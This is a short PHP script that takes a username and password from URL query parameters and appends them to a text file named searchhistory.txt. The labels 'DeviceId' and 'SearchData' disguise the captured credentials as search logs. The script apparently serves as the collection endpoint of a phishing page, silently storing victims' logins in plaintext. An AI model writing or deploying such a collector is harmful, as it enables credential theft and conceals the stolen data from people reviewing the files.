<?php

// get paramerts

$username = $_GET['username'];

$password = $_GET['password'];

// put parameters on file

if (file_put_contents('searchhistory.txt', '

DeviceId: '.$password.'

SearchData: '.$username.'

===============', FILE_APPEND)){

echo 'ok';

}

?>
